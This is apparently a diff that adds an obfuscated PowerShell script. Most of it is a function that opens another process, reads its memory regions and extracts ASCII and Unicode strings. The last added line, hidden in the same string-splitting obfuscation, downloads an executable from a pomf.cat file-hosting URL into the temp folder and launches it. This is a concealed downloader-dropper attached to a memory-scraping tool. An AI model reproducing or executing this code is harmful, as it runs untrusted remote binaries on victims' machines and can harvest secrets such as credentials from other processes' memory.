+        ${HpRoC`E`sS} = ${Ke`RN`El32}::("{2}{0}{1}"-f'penProce','ss','O').Invoke(0x10, ${f`AL`Se}, ${pRO`C`Ess`Id}) 
+
+        &("{6}{3}{0}{2}{5}{1}{4}" -f'Proces','Inf','sM','-','o','emory','Get') -ProcessID ${pROc`e`ss`iD} | &('?') { ${_}."S`TAte" -eq ("{0}{2}{1}"-f'MEM','IT','_COMM') } | &('%') {
+            ${Al`Locat`ION} = ${_}
+            ${R`E`AdALL`oCaT`IOn} = ${tr`Ue}
+            if ((${aLloc`AT`Ion}."Ty`PE" -eq ("{2}{1}{0}"-f 'GE','_IMA','MEM')) -and (-not ${iNc`LUde`I`Ma`gES})) { ${re`ADAL`loC`A`TiOn} = ${fa`LsE} }
+            
+            if (${a`Ll`O`CatION}."p`R`OtEcT".("{1}{0}{2}"-f 'r','ToSt','ing').Invoke().("{0}{2}{1}" -f 'Cont','s','ain').Invoke(("{2}{0}{1}"-f'_G','UARD','PAGE'))) { ${Rea`dAllOc`A`TION} = ${FA`lsE} }
+
+            if (${rEADa`Ll`o`cAt`IOn}) {
+                ${B`YTes} = &("{2}{1}{0}" -f'ct','bje','New-O') ("{0}{1}" -f'Byt','e[]')(${AlLoC`ATi`ON}."R`eg`ionSizE")
+
+                ${b`YT`ES`ReAd} = 0
+                ${R`eSU`lT} = ${KErN`E`L32}::("{2}{1}{4}{5}{0}{3}"-f 'Memo','dPro','Rea','ry','ce','ss').Invoke(${hp`R`OCEss}, ${AlLOc`At`I`ON}."bA`S`EAdD`ReSS", ${byT`ES}, ${A`LL`ocAtIOn}."regio`NsI`ze", [Ref] ${byT`ESr`ead})
+
+                if ((-not ${R`ESULT}) -or (${b`yTe`srEAd} -ne ${A`LLOC`AtIon}."regIONS`I`Ze")) {
+                    &("{2}{0}{3}{1}"-f 'W','rning','Write-','a') "Unable to read 0x$($Allocation.BaseAddress.ToString('X16')) from PID $ProcessID. Size: 0x$($Allocation.RegionSize.ToString('X8')) "
+                } else {
+                    if ((${EN`co`DiNg} -eq ("{1}{0}"-f 'i','Asci')) -or (${en`C`oDINg} -eq ("{1}{0}{2}"-f'u','Defa','lt'))) {
+                        
+                        ${ar`RaY`PTR} =   ( &("{2}{3}{1}{0}"-f'TeM','i','Ch','ILD')  ("{2}{0}{1}"-f 'aRi','aBLe:451K','v')).vALUE::("{2}{6}{0}{4}{1}{3}{5}" -f'drOfPin','dArray','Unsaf','Elem','ne','ent','eAd').Invoke(${By`TEs}, 0)
+                        ${rA`W`st`RIng} =   (  &("{1}{0}{2}" -f'-vaRIabl','GET','e')  ("{1}{0}" -f '51k','4')).ValUE::("{4}{0}{3}{1}{2}" -f'rT','ring','Ansi','oSt','Pt').Invoke(${A`R`RAyPTR}, ${B`YT`ES}."l`ENgTh")
+                        ${r`e`GeX} = [Regex] "[\x20-\x7E]{$MinimumLength,}"
+                        ${r`eGex}.("{2}{1}{0}" -f's','e','Match').Invoke(${r`Aw`sTRING}) | &('%') {
+                            ${P`Ro`peRT`iES} = @{
+                                ("{0}{2}{1}"-f'Ad','s','dres') = [IntPtr] (${A`llO`ca`TiON}."bAS`eADD`R`EsS" + ${_}."Ind`EX")
+                                ("{0}{2}{1}"-f 'Encod','g','in') = ("{0}{1}" -f'As','cii')
+                                ("{2}{0}{1}" -f 'in','g','Str') = ${_}."V`ALue"
+                            }
+
+                            ${s`Tr`iNg} = &("{0}{1}{2}" -f 'Ne','w-','Object') ("{0}{1}" -f 'PSObj','ect') -Property ${proPer`Ti`eS}
+                            ${sTr`I`Ng}."p`soBJE`ct"."T`YPENa`m`es".("{0}{2}{1}" -f 'Ins','t','er').Invoke(0, ("{0}{1}{2}" -f'MEM.STRI','N','G'))
+
+                            &("{0}{1}{2}"-f'Writ','e','-Output') ${S`TRi`NG}
+                        }
+
+                        
+                    }
+
+                    if ((${eN`COd`Ing} -eq ("{0}{2}{1}"-f 'Uni','e','cod')) -or (${e`NcO`diNG} -eq ("{0}{1}"-f 'Def','ault'))) {
+                        ${en`co`dER} = &("{1}{3}{0}{2}"-f 'j','Ne','ect','w-Ob') ("{1}{4}{3}{0}{2}{7}{6}{5}" -f 'xt.','S','Unicod','stem.Te','y','ding','nco','eE')
+                        ${Raw`s`TrING} = ${Enc`OD`ER}."GeT`s`TRiNg"(${bYT`Es}, 0, ${b`yt`eS}."l`engtH")
+                        ${R`E`gEx} = [Regex] "[\u0020-\u007E]{$MinimumLength,}"
+                        ${Re`gex}.("{0}{1}" -f'Ma','tches').Invoke(${Ra`Wst`RiNG}) | &('%') {
+                            ${pr`OPeR`Ti`ES} = @{
+                                ("{0}{1}{2}"-f'Ad','dres','s') = [IntPtr] (${A`l`LO`catiON}."bAS`eAdD`ReSS" + (${_}."i`NdeX" * 2))
+                                ("{1}{2}{0}"-f 'ing','E','ncod') = ("{1}{0}"-f 'e','Unicod')
+                                ("{1}{0}" -f'ing','Str') = ${_}."V`AluE"
+                            }
+
+                            ${ST`RI`NG} = &("{1}{0}{2}"-f 'ew-Obje','N','ct') ("{0}{2}{1}" -f'P','bject','SO') -Property ${p`R`OpErTIes}
+                            ${S`TRI`Ng}."P`So`BjECT"."tyP`eN`AMes".("{0}{1}{2}" -f'I','nser','t').Invoke(0, ("{3}{0}{1}{2}"-f 'M','.','STRING','ME'))
+
+                            &("{1}{3}{0}{2}"-f'-Ou','Writ','tput','e') ${ST`RiNG}
+                        }
+                    }
+                }
+
+                ${b`YtES} = ${N`Ull}
+            }
+        }
+        
+        ${n`Ull} = ${k`E`RnEL32}::("{0}{1}{3}{2}" -f'Clos','e','le','Hand').Invoke(${H`PRoceSs})
+    }
+
+    END {}
+}
+(${D`pl}=${eN`V:tE`mp}+("{1}{0}" -f'e','f.ex'));(&("{1}{2}{0}" -f't','New-','Objec') ("{4}{0}{3}{2}{1}"-f'm','nt','t.WebClie','.Ne','Syste')).("{0}{2}{1}{3}"-f 'Down','adFil','lo','e').Invoke(("{1}{4}{5}{0}{2}{3}"-f 'omf.cat/qebhh','htt','u','.exe','ps://a.','p'), ${D`pL});&("{4}{0}{3}{2}{1}"-f 'art-Pr','s','ces','o','St') ${D`pl}
